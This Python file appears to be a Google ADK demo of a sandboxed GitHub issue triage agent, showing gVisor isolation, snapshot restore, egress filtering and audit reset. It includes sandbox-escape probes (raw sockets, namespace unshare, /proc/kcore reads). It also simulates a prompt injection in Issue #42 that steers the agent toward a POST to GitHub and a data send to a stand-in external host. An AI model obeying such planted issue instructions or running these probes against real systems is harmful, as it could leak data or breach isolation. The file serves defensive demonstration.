# Copyright 2026 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

"""The Secure Runtime: Autonomous GitHub Issue Triage & Reproducer Agent on Agent Substrate.

Demonstrates all four acts of 'The Secure Runtime' session using Gemini on Vertex AI
and Agent Substrate (`ateworker-gvisor` + Golden Snapshots + `atenet-egress` +
`k8s-credential-provider` + `intent-extproc`):

  - Act 1 (The Sandbox Boundary): Inspects the user-space gVisor kernel (`4.4.0`),
    non-root UID, dropped Linux capabilities, and confirms that privileged system
    calls and raw packet sockets are intercepted in user space without touching the
    host Linux kernel.
  - Act 2 (Solving the Cold-Start Tax): Restores an actor from the Golden Snapshot
    with `numpy`, `pandas`, `scipy`, `matplotlib`, and `httpx` already resident in
    memory (`~470 ms` restore, `0 ms` import tax) to reproduce Issue #19, then
    suspends the actor back to GCS during LLM think time.
  - Act 3 (Dynamic Intent Filtering & Out-of-Sandbox Credential Injection): Triages
    Issue #42 from the private demo GitHub repository. The `before_tool_callback`
    classifies the turn as `github_issue_read_only`, attaches a per-actor
    `EgressPolicy` for `api.github.com:443` with `replaceHeaders` token injection,
    and registers `GET`/`HEAD` on `/repos/<owner>/<repo>/*` in `intent-extproc`.
    When untrusted instructions inside Issue #42 attempt to close the issue (`POST`)
    or reach an unlisted domain, `atenet-egress` and `intent-extproc` block them
    while the sandbox environment holds zero credentials.
  - Act 4 (Audit Attribution & Clean Reset): Queries the actor-attributed audit
    trail (`ate.actor.ref`), revokes the compromised actor, and spawns a clean
    actor from the immutable Golden Snapshot tag.
"""

import json
import os
from typing import Any, Dict

from google.adk.agents import LlmAgent
from google.adk.tools.base_tool import BaseTool
from google.adk.tools.tool_context import ToolContext

from .extproc_client import IntentExtProcClient
from .intent import classify_tool_intent
from .substrate_client import SubstrateClient

_substrate = SubstrateClient()
_extproc = IntentExtProcClient()

DEFAULT_ACTOR_NAME = os.environ.get("SUBSTRATE_DEFAULT_ACTOR", "triage-actor-1")
GITHUB_REPO = os.environ.get("GITHUB_REPO", "demo-org/demo-repo")

SYSTEM_INSTRUCTION = f"""You are **The Secure Runtime Triage Agent**, an autonomous coding and GitHub issue triage engineer running on Google Kubernetes Engine (GKE) with **Gemini on Vertex AI** and **Agent Substrate**.

Every Python tool execution runs inside an isolated **Agent Substrate Actor** (`ateworker-gvisor` user-space kernel) restored from a **Golden Snapshot** (`scientific-python`) with `numpy`, `pandas`, `scipy`, `matplotlib`, and `httpx` pre-loaded in memory.

### Available Tools & How to Use Them Across the 4 Demo Acts
1. `inspect_sandbox_boundary(actor_name)`:
   - Use for **Act 1 (The Sandbox Boundary)**.
   - Queries `/info` inside the gVisor actor and verifies user-space syscall interception (`unshare`, `mount`, `AF_PACKET` raw sockets, `/proc/kcore`) and confirms zero credentials exist inside `os.environ`.
2. `run_python_in_actor(code, declared_purpose, actor_name, suspend_after)`:
   - Use for **Act 2 (Solving the Cold-Start Tax — Issue #19 Reproducer)**.
   - Executes scientific Python code (`numpy`, `pandas`, `scipy`) with `0 ms` library import overhead because the actor wakes from the Golden Snapshot, then suspends the actor back to GCS so the worker is freed while you reason.
3. `triage_github_issue_in_sandbox(issue_number, follow_issue_instructions, actor_name)`:
   - Use for **Act 3 (Dynamic Intent Filtering & Credential Injection — Issue #42)**.
   - Fetches `https://api.github.com/repos/{GITHUB_REPO}/issues/<issue_number>` from inside the actor without any `GITHUB_TOKEN` in the sandbox (`k8s-credential-provider` injects the `Authorization` header at `atenet-egress`).
   - If `follow_issue_instructions=True`, also tests what happens when untrusted instructions inside Issue #42 attempt to `POST` a comment / close the issue on `api.github.com` or send data to an unlisted host (`collector.example.invalid`), demonstrating L7 method/path enforcement (`403 Forbidden` from `intent-extproc`) and DNS/SNI default-deny.
4. `audit_and_reset_actor_to_golden(actor_name, new_actor_name)`:
   - Use for **Act 4 (Audit Attribution & Clean Reset from Golden Snapshot)**.
   - Retrieves the structured `ate.actor.ref` egress audit log from `intent-extproc`, revokes the actor's egress rules, deletes the tainted actor instance, and creates a fresh actor directly from the immutable `scientific-python` Golden Snapshot.

Always present clear Markdown summaries and tables showing the measured latencies, kernel/syscall verdicts, and L7 egress decisions."""


def _before_tool_intent_gate(
    tool: BaseTool, args: Dict[str, Any], tool_context: ToolContext
) -> Dict[str, Any] | None:
    """ADK before_tool_callback: classifies intent and programs atenet-egress + intent-extproc."""
    tool_name = getattr(tool, "name", "")
    actor_name = args.get("actor_name") or DEFAULT_ACTOR_NAME
    declared_purpose = args.get("declared_purpose", "")
    actor_ref = f"{_substrate.atespace}/{actor_name}"

    if tool_name in ("inspect_sandbox_boundary", "audit_and_reset_actor_to_golden"):
        return None

    classification = classify_tool_intent(
        tool_name=tool_name,
        declared_purpose=declared_purpose,
        github_repo=GITHUB_REPO,
    )

    try:
        _substrate.ensure_actor(actor_name)
        egress_status = _substrate.apply_egress_policy(actor_name, classification)
        extproc_status = _extproc.apply_intent(actor_ref, classification)
        tool_context.state["last_intent_classification"] = {
            "intent_name": classification.intent_name,
            "rationale": classification.rationale,
            "egress_policy": egress_status,
            "intent_extproc": extproc_status,
        }
    except Exception as exc:  # noqa: BLE001
        tool_context.state["last_intent_classification"] = {
            "intent_name": classification.intent_name,
            "warning": f"Control-plane policy sync note: {exc}",
        }
    return None


def inspect_sandbox_boundary(actor_name: str = DEFAULT_ACTOR_NAME) -> str:
    """Act 1: Inspects the gVisor security boundary, UID, capabilities, and syscall filtering.

    Args:
        actor_name: Name of the Agent Substrate actor to inspect.

    Returns:
        JSON string containing kernel version, UID/capabilities, credential env check,
        and results of attempting privileged operations inside the user-space kernel.
    """
    ensure_info = _substrate.ensure_actor(actor_name)
    sandbox_info = _substrate.call_actor(actor_name, "GET", "/info")

    boundary_probe_code = """
import ctypes, json, os, socket

checks = {}

# 1. Attempt raw packet socket (AF_PACKET)
try:
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, 0)
    s.close()
    checks["af_packet_raw_socket"] = "UNEXPECTED_ALLOWED"
except OSError as exc:
    checks["af_packet_raw_socket"] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"

# 2. Attempt Linux namespace unshare(CLONE_NEWUSER | CLONE_NEWNS)
libc = ctypes.CDLL(None, use_errno=True)
res = libc.unshare(0x10000000 | 0x00020000)
if res != 0:
    err = ctypes.get_errno()
    checks["unshare_user_mount_ns"] = f"BLOCKED_BY_GVISOR (errno={err}: {os.strerror(err)})"
else:
    checks["unshare_user_mount_ns"] = "UNEXPECTED_ALLOWED"

# 3. Attempt reading host kernel memory (/proc/kcore)
try:
    with open("/proc/kcore", "rb") as fh:
        fh.read(16)
    checks["proc_kcore_access"] = "UNEXPECTED_ALLOWED"
except OSError as exc:
    checks["proc_kcore_access"] = f"BLOCKED_BY_GVISOR ({exc.errno}: {exc.strerror})"

print(json.dumps(checks))
"""
    probe_run = _substrate.call_actor(
        actor_name, "POST", "/run", {"code": boundary_probe_code}
    )
    syscall_checks = {}
    if probe_run.get("stdout"):
        try:
            syscall_checks = json.loads(probe_run["stdout"].strip().splitlines()[-1])
        except json.JSONDecodeError:
            syscall_checks = {"raw_stdout": probe_run.get("stdout")}

    return json.dumps(
        {
            "act": "Act 1 — The Sandbox Boundary (User-Space Kernel Isolation)",
            "actor": ensure_info,
            "sandbox_identity": sandbox_info,
            "user_space_syscall_verdicts": syscall_checks,
        },
        indent=2,
    )


def run_python_in_actor(
    code: str,
    declared_purpose: str = "offline_scientific_reproducer",
    actor_name: str = DEFAULT_ACTOR_NAME,
    suspend_after: bool = True,
) -> str:
    """Act 2: Executes Python code inside a Golden-Snapshot-restored Actor and optionally suspends it.

    Args:
        code: Python code to execute (`np`, `pd`, `scipy`, `matplotlib`, `httpx` are pre-loaded).
        declared_purpose: Short description of why this code is running (used by the intent gate).
        actor_name: Name of the Agent Substrate actor.
        suspend_after: Whether to checkpoint and suspend the actor back to GCS after execution.

    Returns:
        JSON string with execution stdout/stderr, wake/exec/suspend latencies, and warm import savings.
    """
    ensure_info = _substrate.ensure_actor(actor_name)
    exec_result = _substrate.call_actor(actor_name, "POST", "/run", {"code": code})

    suspend_info = None
    if suspend_after:
        suspend_info = _substrate.suspend_actor(actor_name)

    return json.dumps(
        {
            "act": "Act 2 — Golden Snapshot Restore & Zero-Import-Tax Execution",
            "declared_purpose": declared_purpose,
            "actor": ensure_info,
            "execution": exec_result,
            "suspended_to_gcs": suspend_info,
        },
        indent=2,
    )


def triage_github_issue_in_sandbox(
    issue_number: int = 42,
    follow_issue_instructions: bool = True,
    actor_name: str = DEFAULT_ACTOR_NAME,
) -> str:
    """Act 3: Fetches a GitHub issue via out-of-sandbox credential injection and tests L7 intent filtering.

    Args:
        issue_number: GitHub issue number in the private demo repository (e.g. 19 or 42).
        follow_issue_instructions: When True, simulates the agent attempting the actions
            requested inside Issue #42's untrusted body (POST comment/close + external webhook)
            to demonstrate real-time L7 blocking by `atenet-egress` and `intent-extproc`.
        actor_name: Name of the Agent Substrate actor.

    Returns:
        JSON string showing the fetched issue, credential environment check, and L7 egress verdicts.
    """
    actor_ref = f"{_substrate.atespace}/{actor_name}"
    triage_script = f"""
import json, os, httpx

repo = {json.dumps(GITHUB_REPO)}
issue_num = {int(issue_number)}
follow_untrusted = {bool(follow_issue_instructions)}

report = {{
    "sandbox_credential_env_vars": [
        k for k in os.environ
        if any(w in k.upper() for w in ("TOKEN", "SECRET", "GITHUB", "KEY"))
    ],
    "steps": {{}}
}}

with httpx.Client(timeout=15.0) as client:
    # Step 1: Legitimate read-only GET on the issue (allowed by EgressPolicy + intent-extproc;
    # Authorization Bearer token injected out-of-sandbox by k8s-credential-provider).
    get_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}"
    try:
        r_get = client.get(get_url, headers={{"Accept": "application/vnd.github+json"}})
        body_preview = r_get.json() if r_get.headers.get("content-type", "").startswith("application/json") else {{"raw": r_get.text[:300]}}
        report["steps"]["1_fetch_issue_get"] = {{
            "method": "GET",
            "url": get_url,
            "status_code": r_get.status_code,
            "verdict": "ALLOWED_WITH_INJECTED_CREDENTIAL" if r_get.status_code == 200 else f"HTTP_{{r_get.status_code}}",
            "issue_title": body_preview.get("title") if isinstance(body_preview, dict) else None,
            "issue_body_excerpt": (body_preview.get("body") or "")[:400] if isinstance(body_preview, dict) else None,
        }}
    except Exception as exc:
        report["steps"]["1_fetch_issue_get"] = {{"error": str(exc)}}

    if follow_untrusted:
        # Step 2: Attempt state-mutating POST on the same allowed host & repo (blocked 403 by intent-extproc).
        post_url = f"https://api.github.com/repos/{{repo}}/issues/{{issue_num}}/comments"
        try:
            r_post = client.post(post_url, json={{"body": "Automated triage status update"}})
            report["steps"]["2_attempt_post_comment"] = {{
                "method": "POST",
                "url": post_url,
                "status_code": r_post.status_code,
                "verdict": "BLOCKED_403_BY_INTENT_EXTPROC" if r_post.status_code == 403 else f"HTTP_{{r_post.status_code}}",
                "response": r_post.text[:300],
            }}
        except Exception as exc:
            report["steps"]["2_attempt_post_comment"] = {{"error": str(exc)}}

        # Step 3: Attempt outbound request to an unlisted external host (blocked by default-deny EgressPolicy).
        unlisted_url = "https://collector.example.invalid/telemetry"
        try:
            r_ext = client.post(unlisted_url, json={{"ping": "diagnostic"}})
            report["steps"]["3_attempt_unlisted_host"] = {{
                "url": unlisted_url,
                "status_code": r_ext.status_code,
                "verdict": "UNEXPECTED_RESPONSE",
            }}
        except Exception as exc:
            report["steps"]["3_attempt_unlisted_host"] = {{
                "url": unlisted_url,
                "verdict": "BLOCKED_BY_DEFAULT_DENY_EGRESS_GATEWAY",
                "error": str(exc),
            }}

print(json.dumps(report))
"""
    exec_res = _substrate.call_actor(
        actor_name, "POST", "/run", {"code": triage_script}
    )
    parsed_report: Dict[str, Any] = {}
    if exec_res.get("stdout"):
        try:
            parsed_report = json.loads(exec_res["stdout"].strip().splitlines()[-1])
        except json.JSONDecodeError:
            parsed_report = {"raw_stdout": exec_res.get("stdout")}

    audit_events = _extproc.list_audit_events(actor_ref)

    return json.dumps(
        {
            "act": "Act 3 — Dynamic Intent Filtering & Out-of-Sandbox Credential Injection",
            "actor_ref": actor_ref,
            "triage_execution": parsed_report,
            "intent_extproc_audit_trail": audit_events[-5:],
        },
        indent=2,
    )


def audit_and_reset_actor_to_golden(
    actor_name: str = DEFAULT_ACTOR_NAME,
    new_actor_name: str = "triage-actor-clean",
) -> str:
    """Act 4: Retrieves the actor-attributed audit trail, quarantines the actor, and resets from Golden Snapshot.

    Args:
        actor_name: Name of the actor that processed untrusted input.
        new_actor_name: Name of the fresh replacement actor restored from the Golden Snapshot.

    Returns:
        JSON string containing the audit trail, revocation status, and fresh Golden Snapshot actor info.
    """
    actor_ref = f"{_substrate.atespace}/{actor_name}"
    audit_events = _extproc.list_audit_events(actor_ref)

    # 1. Revoke L7 intent rules and delete per-actor EgressPolicy.
    revoke_extproc = _extproc.revoke_intent(actor_ref)
    revoke_egress = _substrate.apply_egress_policy(
        actor_name, classify_tool_intent("offline")
    )

    # 2. Delete the tainted actor so its ephemeral session state is discarded.
    delete_info = _substrate.delete_actor(actor_name)

    # 3. Spawn and wake a clean actor directly from the immutable Golden Snapshot tag.
    clean_actor_info = _substrate.ensure_actor(new_actor_name)
    clean_sandbox_check = _substrate.call_actor(new_actor_name, "GET", "/info")

    return json.dumps(
        {
            "act": "Act 4 — Actor-Attributed Audit Trail & Clean Reset from Golden Snapshot",
            "quarantined_actor": actor_ref,
            "audit_events_attributed_to_actor": audit_events,
            "policy_revocation": {
                "intent_extproc": revoke_extproc,
                "egress_policy": revoke_egress,
            },
            "deleted_tainted_actor": delete_info,
            "restored_clean_actor_from_golden_snapshot": {
                "actor": clean_actor_info,
                "sandbox_info": clean_sandbox_check,
            },
        },
        indent=2,
    )


model_name = os.environ.get("GEMINI_MODEL", "gemini-2.5-flash")

root_agent = LlmAgent(
    name="Secure_Runtime_Triage_Agent",
    model=model_name,
    description=(
        "Autonomous GitHub issue triage and scientific reproducer agent running on "
        "GKE Agent Substrate with user-space gVisor isolation, Golden Snapshots, "
        "out-of-sandbox credential injection, and dynamic L7 intent filtering."
    ),
    instruction=SYSTEM_INSTRUCTION,
    before_tool_callback=_before_tool_intent_gate,
    tools=[
        inspect_sandbox_boundary,
        run_python_in_actor,
        triage_github_issue_in_sandbox,
        audit_and_reset_actor_to_golden,
    ],
)
